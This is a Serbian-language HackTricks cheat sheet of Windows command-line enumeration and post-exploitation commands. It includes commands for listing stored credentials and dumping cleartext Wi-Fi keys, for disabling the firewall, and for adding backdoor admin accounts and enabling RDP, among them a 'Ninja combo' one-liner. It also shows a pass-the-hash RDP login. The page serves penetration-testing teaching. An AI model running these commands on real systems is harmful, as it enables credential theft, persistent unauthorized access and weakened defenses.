# Basic Win CMD for Pentesters

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? ≈Ωelite li da vidite **va≈°u kompaniju reklamiranu na HackTricks-u**? Ili ≈æelite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridru≈æite se** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** üê¶[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informacije o sistemu

### Informacije o verziji i zakrpama

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```

### Okru≈æenje

```bash
set #List all environment variables
```

Neki okru≈æni promenljivi za istakavanje:

* **COMPUTERNAME**: Ime raƒçunara
* **TEMP/TMP:** Privremena fascikla
* **USERNAME:** Va≈°e korisniƒçko ime
* **HOMEPATH/USERPROFILE:** Matiƒçni direktorijum
* **windir:** C:\Windows
* **OS**: Windows operativni sistem
* **LOGONSERVER**: Ime kontrolora domena
* **USERDNSDOMAIN**: Ime domena za upotrebu sa DNS-om
* **USERDOMAIN**: Ime domena

```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

### Montirani diskovi

***

#### Pregled montiranih diskova

Da biste videli sve montirane diskove na Windows operativnom sistemu, mo≈æete koristiti sledeƒáu komandu:

```plaintext
wmic logicaldisk get caption, description, volumename
```

Ova komanda ƒáe prikazati sve montirane diskove, zajedno sa njihovim oznakama, opisima i nazivima volumena.

***

#### Montiranje diska

Da biste montirali disk na Windows operativnom sistemu, mo≈æete koristiti sledeƒáu komandu:

```plaintext
mountvol <disk> <putanja>
```

Gde `<disk>` predstavlja oznaku diska koji ≈æelite da montirate, a `<putanja>` predstavlja putanju na koju ≈æelite da montirate disk.

Na primer, ako ≈æelite da montirate disk sa oznakom "D:" na putanju "C:\mount", koristite sledeƒáu komandu:

```plaintext
mountvol D: C:\mount
```

***

#### Demontiranje diska

Da biste demontirali disk sa Windows operativnog sistema, mo≈æete koristiti sledeƒáu komandu:

```plaintext
mountvol <putanja> /d
```

Gde `<putanja>` predstavlja putanju diska koji ≈æelite da demontirate.

Na primer, ako ≈æelite da demontirate disk sa putanje "C:\mount", koristite sledeƒáu komandu:

```plaintext
mountvol C:\mount /d
```

***

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

### [Defender](authentication-credentials-uac-and-efs/#defender)

### Korpa za recikliranje

```bash
dir C:\$Recycle.Bin /s /b
```

### Procesi, usluge i softver

#### Prikaz procesa

Da biste prikazali aktivne procese na Windows operativnom sistemu, mo≈æete koristiti sledeƒáe komande:

```plaintext
tasklist
```

Ova komanda ƒáe prikazati listu svih trenutno pokrenutih procesa, zajedno sa njihovim ID-ovima, prioritetima, statusima i drugim informacijama.

#### Ubijanje procesa

Ako ≈æelite da zaustavite odreƒëeni proces, mo≈æete koristiti sledeƒáu komandu:

```plaintext
taskkill /PID <PID>
```

Zamijenite `<PID>` sa ID-em procesa koji ≈æelite da zaustavite. Ova komanda ƒáe zatvoriti proces i osloboditi resurse koje je koristio.

#### Prikaz instaliranih servisa

Da biste vidjeli listu instaliranih servisa na Windows operativnom sistemu, koristite sledeƒáu komandu:

```plaintext
sc query
```

Ova komanda ƒáe prikazati sve servise zajedno sa njihovim imenima, statusima i drugim informacijama.

#### Zaustavljanje servisa

Ako ≈æelite da zaustavite odreƒëeni servis, mo≈æete koristiti sledeƒáu komandu:

```plaintext
sc stop <service_name>
```

Zamijenite `<service_name>` sa imenom servisa koji ≈æelite da zaustavite. Ova komanda ƒáe zaustaviti servis i onemoguƒáiti njegovo dalje izvr≈°avanje.

#### Prikaz instaliranog softvera

Da biste vidjeli listu instaliranog softvera na Windows operativnom sistemu, koristite sledeƒáu komandu:

```plaintext
wmic product get name,version
```

Ova komanda ƒáe prikazati sve instalirane programe zajedno sa njihovim imenima i verzijama.

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

## Informacije o domenu

### Whois

Whois je protokol za pretragu baza podataka koje sadr≈æe informacije o registrovanim domenima. Ovaj protokol omoguƒáava pristup informacijama kao ≈°to su vlasnik domena, datum registracije, datum isteka registracije, DNS serveri i druge relevantne informacije.

Da biste dobili informacije o domenu putem Whois protokola, mo≈æete koristiti sledeƒáu komandu:

```plaintext
whois <domen>
```

### NSLookup

NSLookup je alat koji se koristi za pretragu DNS zapisa i dobijanje informacija o DNS serverima koji su zadu≈æeni za odreƒëeni domen. Ovaj alat mo≈æe biti koristan za pronala≈æenje IP adrese povezane sa domenom, kao i za proveru ispravnosti DNS konfiguracije.

Da biste koristili NSLookup, mo≈æete izvr≈°iti sledeƒáu komandu:

```plaintext
nslookup <domen>
```

### Dig

Dig je alat koji se koristi za pretragu DNS zapisa i dobijanje informacija o DNS serverima koji su zadu≈æeni za odreƒëeni domen. Ovaj alat pru≈æa detaljnije informacije o DNS zapisima, ukljuƒçujuƒái IP adrese, TTL vrednosti, tipove zapisa i druge relevantne informacije.

Da biste koristili Dig, mo≈æete izvr≈°iti sledeƒáu komandu:

```plaintext
dig <domen>
```

### Traceroute

Traceroute je alat koji se koristi za praƒáenje putanje paketa od izvora do odredi≈°ta preko mre≈æe. Ovaj alat mo≈æe biti koristan za identifikaciju mre≈ænih taƒçaka preko kojih paketi prolaze, kao i za pronala≈æenje eventualnih problema ili uskih grla u mre≈ænoj infrastrukturi.

Da biste koristili Traceroute, mo≈æete izvr≈°iti sledeƒáu komandu:

```plaintext
traceroute <domen>
```

### Nmap

Nmap je popularan alat za skeniranje mre≈æe koji se koristi za otkrivanje otvorenih portova, identifikaciju servisa koji rade na tim portovima i mapiranje mre≈æne infrastrukture. Ovaj alat mo≈æe biti koristan za identifikaciju ranjivosti i sigurnosnih propusta u mre≈æi.

Da biste koristili Nmap, mo≈æete izvr≈°iti sledeƒáu komandu:

```plaintext
nmap <domen>
```

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list #¬†Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### Dnevnici i dogaƒëaji

Dnevnici i dogaƒëaji su kljuƒçni izvori informacija za istra≈æivanje i analizu sistema. Oni pru≈æaju uvid u aktivnosti koje su se desile na sistemu, kao i u potencijalne sigurnosne incidente. U Windows okru≈æenju, postoje razliƒçiti tipovi dnevnika i dogaƒëaja koji se mogu koristiti u svrhu analize.

#### Windows Event Log

Windows Event Log (Dnevnik dogaƒëaja) je centralizovani izvor informacija o dogaƒëajima koji se de≈°avaju na Windows operativnom sistemu. Dnevnik dogaƒëaja se sastoji od razliƒçitih logova, kao ≈°to su Security, Application, System, i mnogi drugi. Svaki log sadr≈æi informacije o specifiƒçnim dogaƒëajima koji su se desili na sistemu.

#### Security Log

Security Log (Dnevnik sigurnosti) je jedan od najva≈ænijih logova u Windows operativnom sistemu. On bele≈æi informacije o sigurnosnim dogaƒëajima, kao ≈°to su prijavljivanje i odjavljivanje korisnika, promene u privilegijama, neuspeli poku≈°aji prijavljivanja, i mnoge druge aktivnosti koje mogu biti od interesa za istra≈æivaƒçe sigurnosti.

#### Application Log

Application Log (Dnevnik aplikacija) bele≈æi informacije o dogaƒëajima koji se odnose na aplikacije koje se izvr≈°avaju na sistemu. Ovaj log mo≈æe pru≈æiti korisne informacije o gre≈°kama, upozorenjima i drugim dogaƒëajima koji se odnose na aplikacije.

#### System Log

System Log (Dnevnik sistema) bele≈æi informacije o dogaƒëajima koji se odnose na sistemski softver i hardver. Ovaj log mo≈æe sadr≈æati informacije o gre≈°kama, upozorenjima i drugim dogaƒëajima koji se odnose na sistem.

#### Security Auditing

Security Auditing (Sigurnosna revizija) je proces praƒáenja i bele≈æenja sigurnosnih dogaƒëaja na sistemu. Ova funkcionalnost omoguƒáava administratorima da prate i analiziraju aktivnosti na sistemu kako bi otkrili potencijalne sigurnosne pretnje.

#### Event Viewer

Event Viewer (Pregledaƒç dogaƒëaja) je alat koji omoguƒáava pregled i analizu dnevnika i dogaƒëaja na Windows operativnom sistemu. Pomoƒáu ovog alata mo≈æete pregledati razliƒçite logove, filtrirati dogaƒëaje prema odreƒëenim kriterijumima i analizirati informacije o dogaƒëajima.

#### PowerShell Event Logging

PowerShell Event Logging (Bele≈æenje dogaƒëaja u PowerShell-u) je funkcionalnost koja omoguƒáava bele≈æenje dogaƒëaja koji se odnose na izvr≈°avanje PowerShell skripti. Ova funkcionalnost mo≈æe biti korisna za praƒáenje i analizu aktivnosti vezanih za PowerShell.

#### Windows Firewall Log

Windows Firewall Log (Dnevnik Windows Firewall-a) bele≈æi informacije o aktivnostima vezanim za Windows Firewall. Ovaj log mo≈æe pru≈æiti informacije o dolaznim i odlaznim konekcijama, blokiranim paketima i drugim aktivnostima vezanim za Firewall.

#### Sysmon

Sysmon je alat koji pru≈æa detaljnije informacije o dogaƒëajima na sistemu u poreƒëenju sa standardnim Windows logovima. On pru≈æa napredne informacije o procesima, mre≈ænim aktivnostima, promenama u registru i drugim dogaƒëajima koji mogu biti od interesa za istra≈æivaƒçe sigurnosti.

#### Centralized Logging

Centralized Logging (Centralizovano bele≈æenje) je praksa koja podrazumeva slanje dnevnika i dogaƒëaja sa razliƒçitih sistema na centralizovano mesto radi lak≈°e analize i praƒáenja. Ova praksa omoguƒáava efikasnije upravljanje dnevnicima i dogaƒëajima na razliƒçitim sistemima.

```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```

### Korisnici

#### Pregled korisnika

Da biste videli sve korisnike na sistemu, mo≈æete koristiti sledeƒáu komandu:

```plaintext
net user
```

#### Kreiranje korisnika

Da biste kreirali novog korisnika, koristite sledeƒáu komandu:

```plaintext
net user <ime_korisnika> <lozinka> /add
```

#### Brisanje korisnika

Da biste obrisali korisnika, koristite sledeƒáu komandu:

```plaintext
net user <ime_korisnika> /delete
```

### Grupa

#### Pregled grupa

Da biste videli sve grupe na sistemu, koristite sledeƒáu komandu:

```plaintext
net localgroup
```

#### Kreiranje grupe

Da biste kreirali novu grupu, koristite sledeƒáu komandu:

```plaintext
net localgroup <ime_grupe> /add
```

#### Dodavanje korisnika u grupu

Da biste dodali korisnika u grupu, koristite sledeƒáu komandu:

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /add
```

#### Uklanjanje korisnika iz grupe

Da biste uklonili korisnika iz grupe, koristite sledeƒáu komandu:

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /delete
```

```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

### Grupe

Groups (grupe) su organizovani skupovi korisnika u operativnom sistemu Windows. Svaki korisnik mo≈æe pripadati jednoj ili vi≈°e grupa, a grupe se koriste za upravljanje pravima i privilegijama korisnika. U nastavku su prikazane neke osnovne komande za rad sa grupama u Windows operativnom sistemu.

#### Prikaz svih grupa

```plaintext
net localgroup
```

Ova komanda prikazuje sve lokalne grupe na sistemu.

#### Prikaz ƒçlanova grupe

```plaintext
net localgroup <ime_grupe>
```

Ova komanda prikazuje sve ƒçlanove odreƒëene grupe.

#### Dodavanje korisnika u grupu

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /add
```

Ova komanda dodaje odreƒëenog korisnika u odreƒëenu grupu.

#### Uklanjanje korisnika iz grupe

```plaintext
net localgroup <ime_grupe> <ime_korisnika> /delete
```

Ova komanda uklanja odreƒëenog korisnika iz odreƒëene grupe.

#### Kreiranje nove grupe

```plaintext
net localgroup <ime_nove_grupe> /add
```

Ova komanda kreira novu lokalnu grupu.

#### Brisanje grupe

```plaintext
net localgroup <ime_grupe> /delete
```

Ova komanda bri≈°e odreƒëenu grupu.

```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

### Lista sesija

Da biste videli listu aktivnih sesija na ciljnom sistemu, mo≈æete koristiti sledeƒáu komandu:

```plaintext
net session
```

Ova komanda ƒáe prikazati sve trenutno otvorene sesije na ciljnom sistemu, ukljuƒçujuƒái korisniƒçka imena, ID sesija i vreme poslednje aktivnosti.

```
qwinsta
klist sessions
```

### Politika lozinki

Windows operativni sistem podr≈æava postavljanje politike lozinki kako bi se osigurala sigurnost korisniƒçkih naloga. Ova politika defini≈°e zahteve za kreiranje i kori≈°ƒáenje lozinki. Evo nekoliko kljuƒçnih parametara politike lozinki:

* Minimalna du≈æina lozinke: Ovo je najmanji broj karaktera koji lozinka mora da sadr≈æi.
* Zahtev za kompleksnost lozinke: Ovaj parametar defini≈°e da li lozinka mora da sadr≈æi kombinaciju velikih i malih slova, brojeva i specijalnih karaktera.
* Maksimalno trajanje lozinke: Ovo je period nakon kojeg korisnik mora da promeni svoju lozinku.
* Minimalno trajanje lozinke: Ovo je minimalni period koji korisnik mora da saƒçuva lozinku pre nego ≈°to je promeni.
* Broj prethodnih lozinki: Ovaj parametar defini≈°e koliko prethodnih lozinki se pamti i spreƒçava korisnika da ponovo koristi istu lozinku.

Da biste postavili politiku lozinki, mo≈æete koristiti sledeƒáu komandu:

```plaintext
net accounts /minpwlen:<minimalna_du≈æina_lozinke> /complexity:<da/oduzmi> /maxpwage:<maksimalno_trajanje_lozinke> /minpwage:<minimalno_trajanje_lozinke> /uniquepw:<broj_prethodnih_lozinki>
```

Na primer, ako ≈æelite da postavite minimalnu du≈æinu lozinke na 8 karaktera, zahtev za kompleksnost lozinke, maksimalno trajanje lozinke na 90 dana, minimalno trajanje lozinke na 7 dana i da se pamti 5 prethodnih lozinki, koristite sledeƒáu komandu:

```plaintext
net accounts /minpwlen:8 /complexity:yes /maxpwage:90 /minpwage:7 /uniquepw:5
```

Napomena: Ove promene zahtevaju administratorske privilegije i mogu se primeniti samo na lokalnom raƒçunaru.

```
net accounts
```

### Poverenja

Credentials (poverenja) su informacije koje se koriste za autentifikaciju korisnika ili entiteta. To mogu biti korisniƒçko ime i lozinka, digitalni sertifikat, API kljuƒç ili bilo koja druga forma identifikacije. Poverenja se koriste za pristupanje sistemima, aplikacijama ili resursima.

Kada se bavite hakovanjem, poverenja su od velike va≈ænosti jer vam omoguƒáavaju pristup osetljivim informacijama ili funkcionalnostima. Postoji nekoliko tehnika koje mo≈æete koristiti za kraƒëu poverenja, kao ≈°to su phishing, brute force napadi, kraƒëa tokena ili iskori≈°ƒáavanje ranjivosti u autentifikacionom procesu.

Kada imate poverenja, mo≈æete ih koristiti za dalje napade, kao ≈°to su eskalacija privilegija, preuzimanje kontrole nad sistemom ili izvr≈°avanje zlonamernog koda.

Va≈æno je napomenuti da je kraƒëa poverenja nezakonita i da se ove tehnike smeju koristiti samo u okviru legalnih aktivnosti, kao ≈°to su etiƒçko hakovanje ili testiranje bezbednosti.

```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
```

### Upornost sa korisnicima

#### Add a User

#### Dodaj korisnika

To add a new user to the system, you can use the `net user` command. Here's the syntax:

Da biste dodali novog korisnika u sistem, mo≈æete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user <username> <password> /add
```

Replace `<username>` with the desired username and `<password>` with the desired password for the user.

Zamenite `<username>` sa ≈æeljenim korisniƒçkim imenom i `<password>` sa ≈æeljenom lozinkom za korisnika.

#### Enable Remote Desktop

#### Omoguƒái udaljeni radni sto

To enable Remote Desktop on a Windows system, you can use the `reg add` command. Here's the syntax:

Da biste omoguƒáili udaljeni radni sto na Windows sistemu, mo≈æete koristiti `reg add` komandu. Evo sintakse:

```plaintext
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

#### Add User to Local Administrators Group

#### Dodaj korisnika u lokalnu administratorsku grupu

To add a user to the local Administrators group, you can use the `net localgroup` command. Here's the syntax:

Da biste dodali korisnika u lokalnu administratorsku grupu, mo≈æete koristiti `net localgroup` komandu. Evo sintakse:

```plaintext
net localgroup Administrators <username> /add
```

Replace `<username>` with the username of the user you want to add to the Administrators group.

Zamenite `<username>` sa korisniƒçkim imenom korisnika kojeg ≈æelite dodati u administratorsku grupu.

#### Enable Guest Account

#### Omoguƒái gostujuƒái nalog

To enable the Guest account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste omoguƒáili gostujuƒái nalog na Windows sistemu, mo≈æete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Guest /active:yes
```

#### Disable Guest Account

#### Onemoguƒái gostujuƒái nalog

To disable the Guest account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste onemoguƒáili gostujuƒái nalog na Windows sistemu, mo≈æete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Guest /active:no
```

#### Enable Built-in Administrator Account

#### Omoguƒái ugraƒëeni administratorski nalog

To enable the built-in Administrator account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste omoguƒáili ugraƒëeni administratorski nalog na Windows sistemu, mo≈æete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Administrator /active:yes
```

#### Disable Built-in Administrator Account

#### Onemoguƒái ugraƒëeni administratorski nalog

To disable the built-in Administrator account on a Windows system, you can use the `net user` command. Here's the syntax:

Da biste onemoguƒáili ugraƒëeni administratorski nalog na Windows sistemu, mo≈æete koristiti `net user` komandu. Evo sintakse:

```plaintext
net user Administrator /active:no
```

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

## Mre≈æa

### Interfejsi, Rute, Portovi, Hostovi i DNS ke≈°

#### Interfejsi

Prikazuje sve mre≈æne interfejse na sistemu:

```plaintext
ipconfig /all
```

#### Rute

Prikazuje sve rute na sistemu:

```plaintext
route print
```

#### Portovi

Prikazuje otvorene portove na sistemu:

```plaintext
netstat -ano
```

#### Hostovi

Prikazuje informacije o hostovima na mre≈æi:

```plaintext
nslookup <adresa>
```

#### DNS ke≈°

Prikazuje sadr≈æaj DNS ke≈°a:

```plaintext
ipconfig /displaydns
```

### Firewall

#### Pregled statusa Firewall-a

Prikazuje status Firewall-a:

```plaintext
netsh advfirewall show allprofiles
```

#### Iskljuƒçivanje Firewall-a

Iskljuƒçuje Firewall:

```plaintext
netsh advfirewall set allprofiles state off
```

#### Ukljuƒçivanje Firewall-a

Ukljuƒçuje Firewall:

```plaintext
netsh advfirewall set allprofiles state on
```

#### Dodavanje pravila u Firewall

Dodaje pravilo u Firewall:

```plaintext
netsh advfirewall firewall add rule name="<ime_pravila>" dir=in action=allow protocol=<protokol> localport=<port>
```

#### Brisanje pravila iz Firewall-a

Bri≈°e pravilo iz Firewall-a:

```plaintext
netsh advfirewall firewall delete rule name="<ime_pravila>"
```

### Proxy

#### Pode≈°avanje proxy servera

Pode≈°ava proxy server:

```plaintext
netsh winhttp set proxy proxy-server="<adresa>:<port>"
```

#### Poni≈°tavanje pode≈°avanja proxy servera

Poni≈°tava pode≈°avanje proxy servera:

```plaintext
netsh winhttp reset proxy
```

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

### Firewall

### Za≈°tita od po≈æara

Firewall je sigurnosni mehanizam koji se koristi za za≈°titu raƒçunarske mre≈æe od neovla≈°ƒáenog pristupa i napada. On kontroli≈°e i filtrira dolazni i odlazni mre≈æni saobraƒáaj na osnovu definisanih pravila. Ovo je veoma va≈æan alat za osiguravanje bezbednosti sistema.

#### Windows Firewall

Windows Firewall je ugraƒëeni firewall koji dolazi sa operativnim sistemom Windows. On omoguƒáava korisnicima da kontroli≈°u pristup njihovom raƒçunaru i mre≈æi. Mo≈æe se konfigurisati da blokira ili dozvoljava odreƒëene vrste saobraƒáaja na osnovu definisanih pravila.

#### Konfiguracija Windows Firewall-a

Da biste konfigurisali Windows Firewall, mo≈æete koristiti komandnu liniju ili grafiƒçki interfejs. Evo nekoliko osnovnih komandi koje mo≈æete koristiti:

* **Pregledajte trenutna pravila firewall-a:**

```plaintext
netsh advfirewall firewall show rule name=all
```

* **Dodajte pravilo za dozvoljavanje dolaznog saobraƒáaja na odreƒëenom portu:**

```plaintext
netsh advfirewall firewall add rule name="Allow Port 80" dir=in action=allow protocol=TCP localport=80
```

* **Dodajte pravilo za blokiranje dolaznog saobraƒáaja sa odreƒëene IP adrese:**

```plaintext
netsh advfirewall firewall add rule name="Block IP" dir=in action=block remoteip=192.168.0.1
```

* **Izbri≈°ite pravilo firewall-a:**

```plaintext
netsh advfirewall firewall delete rule name="Block IP"
```

Ove komande vam omoguƒáavaju da konfiguri≈°ete Windows Firewall prema va≈°im potrebama i zahtevima za bezbednost.

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add ‚ÄúHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server‚Äù /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

### Deljenje

#### Pregled

Komanda `net share` se koristi za prikazivanje informacija o deljenim resursima na sistemu. Ova komanda prikazuje naziv deljenog resursa, putanju do resursa, tip resursa i eventualne dodatne opcije.

#### Prikazivanje svih deljenih resursa

```
net share
```

#### Prikazivanje detaljnih informacija o odreƒëenom deljenom resursu

```
net share <naziv_resursa>
```

#### Kreiranje novog deljenog resursa

```
net share <naziv_resursa>=<putanja_do_resursa> [/GRANT:<korisnik>,<prava>] [/REMARK:"komentar"]
```

* `<naziv_resursa>`: Naziv deljenog resursa koji ≈æelite da kreirate.
* `<putanja_do_resursa>`: Putanja do direktorijuma koji ≈æelite da delite.
* `<korisnik>`: Korisnik kojem ≈æelite da dodelite prava pristupa deljenom resursu.
* `<prava>`: Prava pristupa koja ≈æelite da dodelite korisniku (npr. `READ`, `WRITE`, `FULL`).
* `/REMARK:"komentar"`: Opcioni komentar koji mo≈æete dodati deljenom resursu.

#### Brisanje deljenog resursa

```
net share <naziv_resursa> /DELETE
```

* `<naziv_resursa>`: Naziv deljenog resursa koji ≈æelite da obri≈°ete.

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### Wifi

### Be≈æiƒçna mre≈æa

#### View Available Networks

#### Pregled dostupnih mre≈æa

To view the available wifi networks, use the following command:

Da biste videli dostupne be≈æiƒçne mre≈æe, koristite sledeƒáu komandu:

```plaintext
netsh wlan show networks
```

#### Connect to a Network

#### Povezivanje sa mre≈æom

To connect to a wifi network, use the following command:

Da biste se povezali sa be≈æiƒçnom mre≈æom, koristite sledeƒáu komandu:

```plaintext
netsh wlan connect name="network_name"
```

Replace "network\_name" with the name of the network you want to connect to.

Zamenite "network\_name" sa imenom mre≈æe sa kojom ≈æelite da se pove≈æete.

#### Disconnect from a Network

#### Odjavljivanje sa mre≈æe

To disconnect from a wifi network, use the following command:

Da biste se odjavili sa be≈æiƒçne mre≈æe, koristite sledeƒáu komandu:

```plaintext
netsh wlan disconnect
```

#### View Network Profiles

#### Pregled profila mre≈æe

To view the saved network profiles, use the following command:

Da biste videli saƒçuvane profile mre≈æe, koristite sledeƒáu komandu:

```plaintext
netsh wlan show profiles
```

#### Delete a Network Profile

#### Brisanje profila mre≈æe

To delete a saved network profile, use the following command:

Da biste obrisali saƒçuvani profil mre≈æe, koristite sledeƒáu komandu:

```plaintext
netsh wlan delete profile name="profile_name"
```

Replace "profile\_name" with the name of the profile you want to delete.

Zamenite "profile\_name" sa imenom profila koji ≈æelite da obri≈°ete.

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

### SNMP

